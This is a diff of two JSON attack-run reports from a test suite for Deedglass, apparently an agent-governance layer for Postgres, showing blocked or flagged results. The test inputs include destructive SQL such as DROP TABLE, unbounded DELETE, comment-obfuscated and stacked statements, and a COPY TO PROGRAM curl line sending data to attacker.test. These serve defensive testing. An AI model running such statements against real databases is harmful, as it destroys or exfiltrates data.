@@ -1,10 +1,10 @@
 {
   "object": "attack_run",
-  "started_at": "2026-10-25T07:07:59Z",
-  "commit": "b760105",
-  "version": "v0.9.0",
+  "started_at": "2026-10-25T18:56:51Z",
+  "commit": "83b05eb",
+  "version": "v0.10.0",
   "postgres": "18.6 (Homebrew)",
-  "boot_ms": 4242,
+  "boot_ms": 2908,
   "cases": [
     {
       "id": "H01",
@@ -14,25 +14,25 @@
       "detail": "DENIED (block-destructive-sql); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-destructive-sql · connector refuses too",
-      "ms": 120,
+      "ms": 146,
       "evidence": {
         "deny_1": {
-          "action": "act_01m5ry6sw4q6hf4bk4bmpp61h9",
-          "deed": "deed_01m5ry6sw80yffcj6encvqa9ry",
+          "action": "act_01m5t6rks57c3g98xxne2sey17",
+          "deed": "deed_01m5t6rks806hf3mqfmyqsnwzs",
           "error.code": "policy_denied",
           "rule_id": "block-destructive-sql",
           "sql": "DROP TABLE public.orders",
           "status": 403
         },
         "mcp": {
-          "action": "act_01m5ry6sx4f1dvs791s4m4seb7",
+          "action": "act_01m5t6rkt4xqfkrn0w8wetxn75",
           "isError": true,
           "rule": "block-destructive-sql",
-          "text": "[map[text:Blocked by policy \"block-destructive-sql\": DROP is never allowed for agents. Nothing was run. Deedglass sealed a record of this attempt (deed_01m5ry6sx7hy6b5fayqbjh3vd9). If this should be allowed, a person can change the policy in Console › Policies. type:text]]",
+          "text": "[map[text:Blocked by policy \"block-destructive-sql\": DROP is never allowed for agents. Nothing was run. Deedglass sealed a record of this attempt (deed_01m5t6rkt8mh8y58hpxfgg7c23). If this should be allowed, a person can change the policy in Console › Policies. type:text]]",
           "tools_list_has_postgres_execute": true
         },
         "permissive_1": {
-          "action": "act_01m5ry6swmnvjfetq80ee4pcyx",
+          "action": "act_01m5t6rksm6yg0b9m1ny63dn3z",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: schema change (DROP) statements never run through agents.",
           "execution": "failed",
@@ -41,7 +41,7 @@
           "status": 200,
           "tool": "postgres.execute"
         },
-        "poisoned_read": "act_01m5ry6svfpq6ckkc3r9axccdt"
+        "poisoned_read": "act_01m5t6rkrh4m1an1adyejhpp5p"
       }
     },
     {
@@ -52,11 +52,11 @@
       "detail": "DENIED (block-unbounded-writes)",
       "status": "matched",
       "line": "block-unbounded-writes",
-      "ms": 70,
+      "ms": 81,
       "evidence": {
         "deny_1": {
-          "action": "act_01m5ry6t86kcr5d4r1wvrnzrpa",
-          "deed": "deed_01m5ry6t8b1eh6qgxmdvh11egw",
+          "action": "act_01m5t6rm6bmvaf9yhxspmn25ft",
+          "deed": "deed_01m5t6rm6gvzw2ngv7yhjbfre5",
           "error.code": "policy_denied",
           "rule_id": "block-unbounded-writes",
           "sql": "DELETE FROM public.orders",
@@ -72,26 +72,26 @@
       "detail": "DENIED (block-multi-statement); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-multi-statement · connector refuses too",
-      "ms": 97,
+      "ms": 112,
       "evidence": {
         "deny_1": {
-          "action": "act_01m5ry6tc1rm6ev8pehafsy4nv",
-          "deed": "deed_01m5ry6tc51h5dnkmz159g87yb",
+          "action": "act_01m5t6rmahhqm9zhxwpfbraw8g",
+          "deed": "deed_01m5t6rmanqyfgsb80t1ewncep",
           "error.code": "policy_denied",
           "rule_id": "block-multi-statement",
           "sql": "SELECT 1; DROP TABLE public.orders",
           "status": 403
         },
         "deny_2": {
-          "action": "act_01m5ry6tce4fdf5r5rz27y6q2d",
-          "deed": "deed_01m5ry6tchb8wzwe0fbmeaqmta",
+          "action": "act_01m5t6rmavhjk16g3tkqqc6k13",
+          "deed": "deed_01m5t6rmayxjzpa9ybe0f0q2jb",
           "error.code": "policy_denied",
           "rule_id": "block-multi-statement",
           "sql": "SELECT id FROM public.orders; COMMIT; DROP TABLE public.orders",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m5ry6tcq536sj8e9vke7c45p",
+          "action": "act_01m5t6rmb7yc74d4wwjby38gqw",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: the statement has 2 commands. Deedglass runs one statement per action.",
           "execution": "failed",
@@ -101,7 +101,7 @@
           "tool": "postgres.execute"
         },
         "permissive_2": {
-          "action": "act_01m5ry6td27bg1wrqkyv16gta3",
+          "action": "act_01m5t6rmbktrtfdtxwbt1g1xx6",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: the statement has 3 commands. Deedglass runs one statement per action.",
           "execution": "failed",
@@ -120,34 +120,34 @@
       "detail": "DENIED (block-destructive-sql); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-destructive-sql · connector refuses too",
-      "ms": 113,
+      "ms": 127,
       "evidence": {
         "deny_1": {
-          "action": "act_01m5ry6tgwfrvn438n2tng5tsb",
-          "deed": "deed_01m5ry6th0e2amst2a93s7a85e",
+          "action": "act_01m5t6rmfydpvt6y1hwz0kcbx5",
+          "deed": "deed_01m5t6rmg2dz5cdwbjv0qcvmbd",
           "error.code": "policy_denied",
           "rule_id": "block-destructive-sql",
           "sql": "/* harmless */ DROP TABLE public.orders",
           "status": 403
         },
         "deny_2": {
-          "action": "act_01m5ry6th9bsc13g7czrz9j42s",
-          "deed": "deed_01m5ry6thcr67kt65p2w3g9z4z",
+          "action": "act_01m5t6rmg9y255d7dr5eecgwnd",
+          "deed": "deed_01m5t6rmgcfe81xphqnntkzfdf",
           "error.code": "policy_denied",
           "rule_id": "block-destructive-sql",
           "sql": "/* a /* nested */ b */ DROP TABLE public.orders",
           "status": 403
         },
         "deny_3": {
-          "action": "act_01m5ry6thhket8m6y0xrkws2sf",
-          "deed": "deed_01m5ry6thk9kb0anaq1sbsgctp",
+          "action": "act_01m5t6rmgj3qf6akdcf4ezf0xn",
+          "deed": "deed_01m5t6rmgns0xhct2vk15jvvpg",
           "error.code": "policy_denied",
           "rule_id": "block-destructive-sql",
           "sql": "DROP/**/TABLE/**/public.orders",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m5ry6thst5bp7gm6rr4jfnyq",
+          "action": "act_01m5t6rmgv15t312e0fevc0z28",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: schema change (DROP) statements never run through agents.",
           "execution": "failed",
@@ -157,7 +157,7 @@
           "tool": "postgres.execute"
         },
         "permissive_2": {
-          "action": "act_01m5ry6tj2rass448drzfb5mng",
+          "action": "act_01m5t6rmh5p36b5qkb32y8m10f",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: schema change (DROP) statements never run through agents.",
           "execution": "failed",
@@ -167,7 +167,7 @@
           "tool": "postgres.execute"
         },
         "permissive_3": {
-          "action": "act_01m5ry6tjb3qx1c5z6cxhpzw43",
+          "action": "act_01m5t6rmhe377p8svf5g5vx50v",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: schema change (DROP) statements never run through agents.",
           "execution": "failed",
@@ -186,18 +186,18 @@
       "detail": "DENIED (block-copy); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-copy · connector refuses too",
-      "ms": 74,
+      "ms": 102,
       "evidence": {
         "deny_1": {
-          "action": "act_01m5ry6tpc52a8snwsv0cvdwec",
-          "deed": "deed_01m5ry6tpe2v55sdr25tc4e8wd",
+          "action": "act_01m5t6rmp7d39zk6yx1veyxp3e",
+          "deed": "deed_01m5t6rmpb812kpxpp01etnnyt",
           "error.code": "policy_denied",
           "rule_id": "block-copy",
           "sql": "COPY public.orders TO PROGRAM 'curl -d @- http://attacker.test'",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m5ry6tpmyg1wdgckvncsw64x",
+          "action": "act_01m5t6rmpj456m6a9gxpk8bnwk",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: server code (COPY) statements never run through agents.",
           "execution": "failed",
@@ -216,18 +216,18 @@
       "detail": "DENIED (block-do); permissive policy: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-do · connector refuses too",
-      "ms": 73,
+      "ms": 97,
       "evidence": {
         "deny_1": {
-          "action": "act_01m5ry6ttfy6gkn0hb5ts47skx",
-          "deed": "deed_01m5ry6ttje9dv0tj4ak5rabfp",
+          "action": "act_01m5t6rmv8mvwztrn6b94s6eyj",
+          "deed": "deed_01m5t6rmvbernr8y0qkeyg90wh",
           "error.code": "policy_denied",
           "rule_id": "block-do",
           "sql": "DO $$ BEGIN EXECUTE 'DROP TABLE public.orders'; END $$",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m5ry6ttrgr52ayjgg97f5d6z",
+          "action": "act_01m5t6rmvhqbfq8wf85z0c89rb",
           "error_code": "statement_refused",
           "error_message": "Refused by the Postgres connector: server code (DO) statements never run through agents.",
           "execution": "failed",
@@ -246,18 +246,18 @@
       "detail": "DENIED (block-hidden-writes); via postgres.query: BLOCKED (statement_refused)",
       "status": "matched",
       "line": "block-hidden-writes · connector refuses too",
-      "ms": 72,
+      "ms": 90,
       "evidence": {
         "deny_1": {
-          "action": "act_01m5ry6tyecafwgq07m3strr1m",
-          "deed": "deed_01m5ry6tyha5nsmt3jdn80r00j",
+          "action": "act_01m5t6rmzxp9dqv7kstg9g50t0",
+          "deed": "deed_01m5t6rn03crkxbcyjxskt9h9p",
           "error.code": "policy_denied",
           "rule_id": "block-hidden-writes",
           "sql": "WITH d AS (DELETE FROM public.orders RETURNING *) SELECT count(*) FROM d",
           "status": 403
         },
         "permissive_1": {
-          "action": "act_01m5ry6tyqjrf9347eerxdnakf",
+          "action": "act_01m5t6rn09whdm65d0b9q6c5e1",
           "error_code": "statement_refused",
           "error_message": "postgres.query runs read-only statements. Use postgres.execute for statements that change data.",
           "execution": "failed",
@@ -276,7 +276,7 @@
       "detail": "MISMATCH (L2: rows outside the expected footprint)",
       "status": "matched",
       "line": "unexpected_table · public.order_events",
-      "ms": 1217,
+      "ms": 1213,
       "evidence": {
         "L1": [
           "row_written"
@@ -285,7 +285,7 @@
           "unexpected_table",
           "triggers_present"
         ],
-        "action": "act_01m5ry6w4nsk81t5gbk4tqf96w",
+        "action": "act_01m5t6rp6da9qy5dpkdvt99d2z",
         "level": "L2",
         "summary": "Postgres also changed 300 rows in public.order_events, which the statement doesn't touch.",
         "verdict": "MISMATCH"
@@ -299,7 +299,7 @@
       "detail": "MISMATCH (L2: column outside the SET list)",
       "status": "matched",
       "line": "unexpected_column · internal_note",
-      "ms": 1189,
+      "ms": 1182,
       "evidence": {
         "L1": [
           "row_written"
@@ -308,7 +308,7 @@
           "unexpected_column",
           "triggers_present"
         ],
-        "action": "act_01m5ry6xfjf9e0tcsc1k70ccmj",
+        "action": "act_01m5t6rqh3rrvm5gxqq7swep2v",
         "level": "L2",
         "summary": "Postgres changed internal_note on 1 row in public.orders. The statement set only total_cents.",
         "verdict": "MISMATCH"
@@ -322,7 +322,7 @@
       "detail": "DETECTED (forged_marker alert; no action's verdict changes)",
       "status": "matched",
       "line": "forged_marker alert",
-      "ms": 1280,
+      "ms": 1303,
       "evidence": {
         "L1": [
           "row_written"
@@ -330,7 +330,7 @@
         "L2": [
           "footprint_matched"
         ],
-        "action": "act_01m5ry6yt0qhzhp3ncjs9rzxhk",
+        "action": "act_01m5t6rrvtkxh99cdvh9jr6zh0",
         "alert": true,
         "level": "L2",
         "summary": "Postgres committed 1 row in public.customers, as the statement said.",
@@ -345,7 +345,7 @@
       "detail": "UNVERIFIABLE (replica identity gap; never MISMATCH)",
       "status": "matched",
       "line": "old_image_missing",
-      "ms": 1187,
+      "ms": 1198,
       "evidence": {
         "L1": [
           "level_below_required",
@@ -354,7 +354,7 @@
         "L2": [
           "old_image_missing"
         ],
-        "action": "act_01m5ry707m6hg73f64x4f53qq7",
+        "action": "act_01m5t6rtadcr7ed7aemcc1692d",
         "level": "L1",
         "summary": "The policy asks for L2. The strongest clean evidence was L1.",
         "verdict": "UNVERIFIABLE"
@@ -368,10 +368,10 @@
       "detail": "REJECTED (agent_suspended)",
       "status": "matched",
       "line": "agent_suspended · refused in 4 ms",
-      "ms": 77,
+      "ms": 75,
       "evidence": {
         "after": {
-          "action": "act_01m5ry70gy34pydwm41v2dkza7",
+          "action": "act_01m5t6rtkf0q8atj1y8wz6tssw",
           "error.code": "agent_suspended",
           "message": "Agent \"suspend-bot\" is suspended. An admin can resume it in Console › Agents.",
           "status": 403,
@@ -391,7 +391,7 @@
       "detail": "REJECTED (api_key_revoked)",
       "status": "matched",
       "line": "api_key_revoked · refused in 0 ms",
-      "ms": 66,
+      "ms": 80,
       "evidence": {
         "after": {
           "action": "",
@@ -414,7 +414,7 @@
       "detail": "REJECTED (intent_replay); the first use executes exactly once",
       "status": "matched",
       "line": "intent_replay · 1 of 16 executed",
-      "ms": 94,
+      "ms": 134,
       "evidence": {
         "concurrent": {
           "executed": 1,
@@ -443,13 +443,13 @@
       "actual": "DENIED",
       "detail": "DENIED (budget_exceeded) after exactly 60 executed",
       "status": "matched",
-      "line": "budget_exceeded · 60 executed · 140 denied · 445 ms",
-      "ms": 652,
+      "line": "budget_exceeded · 60 executed · 140 denied · 439 ms",
+      "ms": 663,
       "evidence": {
         "accepted": 60,
         "budget_exceeded": 140,
         "executed": 60,
-        "message": "Budget \"calls_per_minute\" for agent \"burst-bot\" reached: 60 of 60 calls this minute. Try again in 42 s.",
+        "message": "Budget \"calls_per_minute\" for agent \"burst-bot\" reached: 60 of 60 calls this minute. Try again in 55 s.",
         "other": 0,
         "sealed_denials": 140,
         "usage_counter": [
@@ -457,7 +457,7 @@
             "60"
           ]
         ],
-        "wall_ms": 445
+        "wall_ms": 439
       }
     },
     {
@@ -468,7 +468,7 @@
       "detail": "BLOCKED (destination_blocked at config and at dial; 0 packets)",
       "status": "matched",
       "line": "destination_blocked · config and dial · 0 packets",
-      "ms": 77,
+      "ms": 80,
       "evidence": {
         "config_1": {
           "error.code": "destination_blocked",
@@ -492,7 +492,7 @@
           "url": "http://169.254.169.254/mcp"
         },
         "rebind": {
-          "action": "act_01m5ry71y08sr76sk7bzbpydj9",
+          "action": "act_01m5t6rw2kjd8gheryjyebt9fd",
           "call_status": 200,
           "create_status": 201,
           "differs": "",
@@ -508,17 +508,17 @@
       "detail": "BLOCKED (redirect refused; 0 hits on the target)",
       "status": "matched",
       "line": "destination_blocked · 0 hits on the target",
-      "ms": 82,
+      "ms": 93,
       "evidence": {
         "other_hits": 0,
         "redirect.cross": {
-          "action": "act_01m5ry723cz6c4z1phybq0452g",
+          "action": "act_01m5t6rw8d8x7rtg7sdwr5q6cd",
           "differs": "",
           "error_code": "destination_blocked",
           "error_message": "The service redirected the call to another host. Deedglass follows same-host redirects only, so nothing was sent there."
         },
         "redirect.meta": {
-          "action": "act_01m5ry7231vhcmkhpxqv4p102k",
+          "action": "act_01m5t6rw81bcq9x1jwrybff46w",
           "differs": "",
           "error_code": "destination_blocked",
           "error_message": "The connector's destination is blocked by Deedglass's network rules. An admin can see why in Console › Connectors."
@@ -534,17 +534,17 @@
       "detail": "REDACTED (0 sentinel hits in responses, logs, events, deeds)",
       "status": "matched",
       "line": "0 sentinel hits · upstream_auth_failed, upstream_auth_failed",
-      "ms": 156,
+      "ms": 169,
       "evidence": {
         "pg_test_status": "fail",
         "pgsecret_create": 201,
         "postgres": {
-          "action": "act_01m5ry7298ykgkddng2vqkc7w4",
+          "action": "act_01m5t6rweqjhf17fk70e6hr25w",
           "error_code": "upstream_auth_failed",
           "execution": "failed"
         },
         "rest": {
-          "action": "act_01m5ry728p9mza9t8p6v7w010v",
+          "action": "act_01m5t6rwe4ra2v0fpeanj72rk4",
           "error_code": "upstream_auth_failed",
           "execution": "failed"
         },
@@ -562,7 +562,7 @@
       "detail": "DENIED (default) for ASCII look-alikes; non-ASCII names hidden and REJECTED (tool_unknown)",
       "status": "matched",
       "line": "default deny · 2 look-alikes hidden · tool_unknown",
-      "ms": 523,
+      "ms": 542,
       "evidence": {
         "call \"read_file \"": {
           "api_code": "validation_failed",
@@ -581,13 +581,13 @@
           "ran": 0
         },
         "call read_fiIe": {
-          "action": "act_01m5ry72xz3ktm1psrz8rzszs0",
+          "action": "act_01m5t6rx3yh4cej8vx2csj8y5b",
           "differs": "",
           "isError": true,
           "ran": 0
         },
         "call read_files": {
-          "action": "act_01m5ry72yfy8rwtk7dy0we4afk",
+          "action": "act_01m5t6rx4g52wfp1qbds2a9dkp",
           "differs": "",
           "isError": true,
           "ran": 0
@@ -607,7 +607,7 @@
       "detail": "MISMATCH (L2: Postgres changed 301 rows in public.orders, the agent reported 1; 300 rows outside id = 42)",
       "status": "matched",
       "line": "301 rows vs 1 · 300 outside id = 42",
-      "ms": 1187,
+      "ms": 1210,
       "evidence": {
         "L1": [
           "row_written"
@@ -617,7 +617,7 @@
           "unexpected_key",
           "triggers_present"
         ],
-        "action": "act_01m5ry745txkzfny3fnw6kg989",
+        "action": "act_01m5t6ryd143fwmqag9zqkfn8t",
         "expected": 1,
         "level": "L2",
         "observed": 301,
@@ -634,7 +634,7 @@
       "detail": "MISMATCH (L2: a column outside the SET list changed)",
       "status": "matched",
       "line": "unexpected_column · total_cents",
-      "ms": 1184,
+      "ms": 1204,
       "evidence": {
         "L1": [
           "row_written"
@@ -643,7 +643,7 @@
           "unexpected_column",
           "triggers_present"
         ],
-        "action": "act_01m5ry75hvvb2h3vk7g427km4w",
+        "action": "act_01m5t6rzsadbpa5a5e6xpt11d9",
         "level": "L2",
         "summary": "Postgres changed total_cents on 1 row in public.orders. The statement set only status.",
         "verdict": "MISMATCH"
@@ -657,7 +657,7 @@
       "detail": "MISMATCH at L1 and at L2 (value_mismatch: the committed value isn't the SET literal); the claim is L2",
       "status": "matched",
       "line": "value_mismatch at L1 and L2 · \"cancelled\", not \"shipped\"",
-      "ms": 1181,
+      "ms": 1189,
       "evidence": {
         "L1": [
           "value_mismatch"
@@ -666,7 +666,7 @@
           "value_mismatch",
           "triggers_present"
         ],
-        "action": "act_01m5ry76xgcmhfhmzjhtmfyb9a",
+        "action": "act_01m5t6s156w8fyxpcyz3ef1t4c",
         "level": "L2",
         "summary": "Postgres has status = \"cancelled\" on row id = 1 in public.orders. The statement set \"shipped\".",
         "verdict": "MISMATCH"
@@ -680,7 +680,7 @@
       "detail": "MISMATCH (L2: a DELETE where the statement only updates rows)",
       "status": "matched",
       "line": "unexpected_operation · deleted 1 row",
-      "ms": 1179,
+      "ms": 1184,
       "evidence": {
         "L1": [
           "row_written"
@@ -689,7 +689,7 @@
           "unexpected_operation",
           "triggers_present"
         ],
-        "action": "act_01m5ry7893bhf74p10mj7fzdrc",
+        "action": "act_01m5t6s2gy3hhcyentp7n3c3zk",
         "level": "L2",
         "summary": "Postgres deleted 1 row in public.orders. The statement only updates rows.",
         "verdict": "MISMATCH"
@@ -703,7 +703,7 @@
       "detail": "DETECTED (forged_marker frame and a decoder.alert); the live action is L2 · VERIFIED from its own frame",
       "status": "matched",
       "line": "forged_marker alert · the action L2 · VERIFIED",
-      "ms": 1167,
+      "ms": 1161,
       "evidence": {
         "L1": [
           "row_written"
@@ -711,7 +711,7 @@
         "L2": [
           "footprint_matched"
         ],
-        "action": "act_01m5ry79mgwbecm2g4vgcb1jsw",
+        "action": "act_01m5t6s3wqe5fsscgksjja3yyr",
         "alert": true,
         "level": "L2",
         "summary": "Postgres committed 1 row in public.orders, as the statement said.",
@@ -726,7 +726,7 @@
       "detail": "MISMATCH (L2: multiple_transactions), as an amendment deed when the action was already sealed",
       "status": "matched",
       "line": "multiple_transactions · amendment deed",
-      "ms": 1383,
+      "ms": 1401,
       "evidence": {
         "L1": [
           "row_written"
@@ -735,19 +735,19 @@
           "multiple_transactions",
           "footprint_matched"
         ],
-        "action": "act_01m5ry7az6n9ggqq8j9t3y9dm2",
+        "action": "act_01m5t6s57c0hxv4e1s2kd20q34",
         "first": "VERIFIED",
         "history": [
           {
-            "at": "2026-10-25T07:08:28.559Z",
-            "deed": "deed_01m5ry7b0f2hbven5ptkg8kpbm",
+            "at": "2026-10-25T18:57:15.542Z",
+            "deed": "deed_01m5t6s58p2ffegthjcezrheft",
             "kind": "action",
             "level": "L2",
             "verdict": "VERIFIED"
           },
           {
-            "at": "2026-10-25T07:08:28.677Z",
-            "deed": "deed_01m5ry7b45pqk9jrg01qg80h18",
+            "at": "2026-10-25T18:57:15.660Z",
+            "deed": "deed_01m5t6s5cckgz73ap376jkstz5",
             "kind": "amendment",
             "level": "L2",
             "verdict": "MISMATCH"
@@ -766,7 +766,7 @@
       "detail": "UNVERIFIABLE (L2 gap old_image_missing); never MISMATCH",
       "status": "matched",
       "line": "old_image_missing",
-      "ms": 1172,
+      "ms": 1200,
       "evidence": {
         "L1": [
           "level_below_required",
@@ -775,7 +775,7 @@
         "L2": [
           "old_image_missing"
         ],
-        "action": "act_01m5ry7cj04ad2afgtrcs3kxv7",
+        "action": "act_01m5t6s6v4f4p6f4pd7g7w6fv9",
         "level": "L1",
         "summary": "The policy asks for L2. The strongest clean evidence was L1.",
         "verdict": "UNVERIFIABLE"
@@ -789,7 +789,7 @@
       "detail": "MISMATCH (L2: row_count_exceeded; the violation beats the old_image_missing gap)",
       "status": "matched",
       "line": "row_count_exceeded beats old_image_missing",
-      "ms": 1190,
+      "ms": 1212,
       "evidence": {
         "L1": [
           "row_written"
@@ -800,7 +800,7 @@
           "old_image_missing",
           "triggers_present"
         ],
-        "action": "act_01m5ry7dxr4zde83nrnbw005ra",
+        "action": "act_01m5t6s87k149t2h2vt57z1x8n",
         "level": "L2",
         "summary": "Postgres changed 301 rows in public.orders. The agent reported 1.",
         "verdict": "MISMATCH"
@@ -814,13 +814,13 @@
       "detail": "UNVERIFIABLE (L2 gap footprint_unknown; the claim follows the required level); never MISMATCH",
       "status": "matched",
       "line": "footprint_unknown",
-      "ms": 1174,
+      "ms": 1164,
       "evidence": {
         "L1": null,
         "L2": [
           "footprint_unknown"
         ],
-        "action": "act_01m5ry7f9fnwn5wde1dxqhwgbk",
+        "action": "act_01m5t6s9k5eewsq6zm493vsdym",
         "level": "L0",
         "summary": "The policy asks for L2. The strongest clean evidence was L0.",
         "verdict": "UNVERIFIABLE"
@@ -834,7 +834,7 @@
       "detail": "Action deed UNVERIFIABLE (l2_timeout); then an amendment deed L2 · VERIFIED that amends it; the chain verifies",
       "status": "matched",
       "line": "l2_timeout, then an amendment deed L2 · VERIFIED",
-      "ms": 7299,
+      "ms": 8185,
       "evidence": {
         "L1": [
           "row_written"
@@ -842,19 +842,19 @@
         "L2": [
           "footprint_matched"
         ],
-        "action": "act_01m5ry7gnf8zd0zvz9njwbsnnp",
+        "action": "act_01m5t6saz6hxdtndjw2pzk4asf",
         "history": [
           {
-            "at": "2026-10-25T07:08:40.261Z",
-            "deed": "deed_01m5ry7pe5qgvccrvv1sn4rnpw",
+            "at": "2026-10-25T18:57:28.158Z",
+            "deed": "deed_01m5t6shjy3xnj5h070b6pffta",
             "kind": "action",
             "level": "L1",
             "reason": "l2_timeout",
             "verdict": "UNVERIFIABLE"
           },
           {
-            "at": "2026-10-25T07:08:40.314Z",
-            "deed": "deed_01m5ry7pftc4h3tedvx871atvs",
+            "at": "2026-10-25T18:57:28.211Z",
+            "deed": "deed_01m5t6shmkgvndnw7scb7b23q9",
             "kind": "amendment",
             "level": "L2",
             "verdict": "VERIFIED"
@@ -874,7 +874,7 @@
       "detail": "UNVERIFIABLE (L2 gap slot_dropped); never MISMATCH",
       "status": "matched",
       "line": "slot_dropped",
-      "ms": 1202,
+      "ms": 1201,
       "evidence": {
         "L1": [
           "level_below_required",
@@ -883,7 +883,7 @@
         "L2": [
           "slot_dropped"
         ],
-        "action": "act_01m5ry7r16a90srxfsbnczvy69",
+        "action": "act_01m5t6sk6688jy1n42vb5tw8zx",
         "dropped": true,
         "level": "L1",
         "summary": "The policy asks for L2. The strongest clean evidence was L1.",
@@ -898,7 +898,7 @@
       "detail": "UNVERIFIABLE (L2 gap publication_gap); never MISMATCH",
       "status": "matched",
       "line": "publication_gap",
-      "ms": 1200,
+      "ms": 1205,
       "evidence": {
         "L1": [
           "level_below_required",
@@ -907,7 +907,7 @@
         "L2": [
           "publication_gap"
         ],
-        "action": "act_01m5ry7sdnfkvkbb9xs17we819",
+        "action": "act_01m5t6smjwzab618hasebnnhzt",
         "level": "L1",
         "summary": "The policy asks for L2. The strongest clean evidence was L1.",
         "verdict": "UNVERIFIABLE"
@@ -921,7 +921,7 @@
       "detail": "MISMATCH (L2: ledger_mismatch naming sql_digest, never the values)",
       "status": "matched",
       "line": "ledger_mismatch · sql_digest",
-      "ms": 1185,
+      "ms": 1193,
       "evidence": {
         "L1": [
           "row_written"
@@ -930,7 +930,7 @@
           "ledger_mismatch",
           "footprint_matched"
         ],
-        "action": "act_01m5ry7ts97ngf7xevkmtx3h16",
+        "action": "act_01m5t6snyrcae9p9aq0w79xdd0",
         "level": "L2",
         "summary": "The ledger row in Postgres doesn't match what Deedglass authorized (sql_digest).",
         "verdict": "MISMATCH"
@@ -944,7 +944,7 @@
       "detail": "REJECTED (approval_link_invalid on every reuse; the action ran once)",
       "status": "matched",
       "line": "approval_link_invalid · 5 of 5 reuses · ran once",
-      "ms": 633,
+      "ms": 641,
       "evidence": {
         "approval": "approved",
         "executions": 1,
@@ -987,7 +987,7 @@
       "detail": "REJECTED (approval_link_invalid or already_countersigned; the approval stays at 1 of 2 and nothing runs)",
       "status": "matched",
       "line": "approval_link_invalid · already_countersigned · 1 of 2 · nothing ran",
-      "ms": 480,
+      "ms": 476,
       "evidence": {
         "after": {
           "action_status": "pending_approval",
@@ -1019,7 +1019,7 @@
       "detail": "REJECTED (self_approval; nothing runs until another approver countersigns)",
       "status": "matched",
       "line": "self_approval · by id and by email · ran once after another approver",
-      "ms": 170,
+      "ms": 175,
       "evidence": {
         "after_self": {
           "by_email": {
@@ -1061,7 +1061,7 @@
       "detail": "REJECTED (approval_needs_person; the approval stays pending and nothing runs)",
       "status": "matched",
       "line": "approval_needs_person · agent key and admin key · still pending",
-      "ms": 90,
+      "ms": 89,
       "evidence": {
         "admin_key": {
           "error.code": "approval_needs_person",
@@ -1092,7 +1092,7 @@
       "detail": "REJECTED (approval_expired; nothing runs)",
       "status": "matched",
       "line": "approval_expired after a real 60 s expiry · nothing ran",
-      "ms": 63716,
+      "ms": 62337,
       "evidence": {
         "action": {
           "approval_status": "expired",
@@ -1119,7 +1119,7 @@
       "detail": "REJECTED (context_changed; the approval stays pending and nothing runs)",
       "status": "matched",
       "line": "context_changed · session and link · link not burned · still pending",
-      "ms": 156,
+      "ms": 169,
       "evidence": {
         "after": {
           "action_status": "pending_approval",
@@ -1147,7 +1147,7 @@
       "detail": "BLOCKED (destination_blocked at create; 0 deliveries)",
       "status": "matched",
       "line": "destination_blocked · 3 of 3 URLs · 0 deliveries",
-      "ms": 614,
+      "ms": 620,
       "evidence": {
         "create_1": {
           "error.code": "destination_blocked",
@@ -1179,7 +1179,7 @@
       "detail": "REJECTED (ErrSignature for a wrong secret or changed body; ErrTimestamp outside 300 s)",
       "status": "matched",
       "line": "ErrSignature · ErrTimestamp · on a real delivery",
-      "ms": 62,
+      "ms": 74,
       "evidence": {
         "299 s later": "ok",
         "301 s earlier": "ErrTimestamp",
@@ -1200,7 +1200,7 @@
       "detail": "REJECTED (undo_conflict; the undo is failed and Postgres changed no row)",
       "status": "matched",
       "line": "undo_conflict · order 42 stays cancelled · no ledger row",
-      "ms": 1296,
+      "ms": 1328,
       "evidence": {
         "countersign": 200,
         "ledger_rows": [
@@ -1223,7 +1223,7 @@
       "detail": "REJECTED (validation_failed for any field beyond plan_digest, reason, allow_triggers and wait; undo_plan_stale for a digest Deedglass didn't plan; no row changes)",
       "status": "matched",
       "line": "validation_failed · undo_plan_stale · insufficient_scope · no row changed",
-      "ms": 1219,
+      "ms": 1232,
       "evidence": {
         "agent_key": {
           "error.code": "insufficient_scope",
@@ -1249,7 +1249,7 @@
       "detail": "REJECTED (the forged transaction never becomes evidence: the plan holds only the action's own bound transaction, and the forged rows stay as they are)",
       "status": "matched",
       "line": "forged_marker alert · plan holds order 42 only · undo L2 VERIFIED · order 7 untouched",
-      "ms": 1381,
+      "ms": 1416,
       "evidence": {
         "alert": true,
         "order_42": "paid",
@@ -1266,7 +1266,7 @@
           "L2": [
             "undo_restored"
           ],
-          "action": "act_01m5rya0hahzhjw8b5q3dn8jq3",
+          "action": "act_01m5t6vth8wmxfk0pr35g7cde0",
           "level": "L2",
           "summary": "Restored 1 row in public.orders exactly as planned.",
           "verdict": "VERIFIED"
@@ -1281,7 +1281,7 @@
       "detail": "DENIED (tool_unknown, recorded and sealed; nothing reaches Postgres)",
       "status": "matched",
       "line": "tool_unknown · sealed · no ledger row",
-      "ms": 1213,
+      "ms": 1238,
       "evidence": {
         "call": {
           "error.code": "tool_unknown",
@@ -1300,7 +1300,7 @@
       "detail": "REJECTED (not_found for preview and run, exactly as an unknown id; nothing is planned)",
       "status": "matched",
       "line": "not_found · same as an unknown id",
-      "ms": 1201,
+      "ms": 1197,
       "evidence": {
         "preview": {
           "error.code": "not_found",
@@ -1320,7 +1320,7 @@
       "detail": "REJECTED (not_found for close, exclude, preview and undo, exactly as an unknown id; the session stays open with nothing excluded)",
       "status": "matched",
       "line": "not_found · same as an unknown id · the session stays open",
-      "ms": 1170,
+      "ms": 1365,
       "evidence": {
         "GET /v1/observe/sessions/{acme}": {
           "error.code": "not_found",
@@ -1353,7 +1353,7 @@
       "detail": "DENIED (403 insufficient_scope for every agent-key call; the person's exclude is sealed as observe.frame_excluded and the undo preview and its SQL list the transaction left out)",
       "status": "matched",
       "line": "insufficient_scope ×5 · the exclude is sealed and listed",
-      "ms": 4145,
+      "ms": 3643,
